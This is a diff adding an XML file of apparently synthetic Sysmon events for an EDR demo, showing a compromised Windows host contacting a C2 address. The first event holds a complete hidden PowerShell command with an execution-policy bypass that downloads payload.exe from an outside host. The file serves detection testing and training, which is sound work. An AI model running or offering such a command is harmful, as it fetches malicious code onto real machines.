@@ -1,0 +1,48 @@
+<Events>
+  <!-- EDR Demo: Compromised India endpoint (DESKTOP-INDIA) connecting to South Africa C2 (197.234.240.10) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-INDIA</Computer>
+      <TimeCreated SystemTime="2026-07-13T10:00:00.000Z" />
+    </System>
+    <EventData>
+      <Data Name="UtcTime">2026-07-13 10:00:00.000</Data>
+      <Data Name="ProcessGuid">{A1B2C3D4-1234-5678-90AB-CDEF01234567}</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('http://197.234.240.10/payload.exe', 'C:\Windows\Temp\payload.exe')"</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>3</EventID>
+      <Computer>DESKTOP-INDIA</Computer>
+      <TimeCreated SystemTime="2026-07-13T10:00:05.000Z" />
+    </System>
+    <EventData>
+      <Data Name="UtcTime">2026-07-13 10:00:05.000</Data>
+      <Data Name="ProcessGuid">{A1B2C3D4-1234-5678-90AB-CDEF01234567}</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="DestinationIp">197.234.240.10</Data>
+      <Data Name="DestinationPort">80</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>11</EventID>
+      <Computer>DESKTOP-INDIA</Computer>
+      <TimeCreated SystemTime="2026-07-13T10:00:10.000Z" />
+    </System>
+    <EventData>
+      <Data Name="UtcTime">2026-07-13 10:00:10.000</Data>
+      <Data Name="ProcessGuid">{A1B2C3D4-1234-5678-90AB-CDEF01234567}</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetFilename">C:\Windows\Temp\payload.exe</Data>
+    </EventData>
+  </Event>
+</Events>
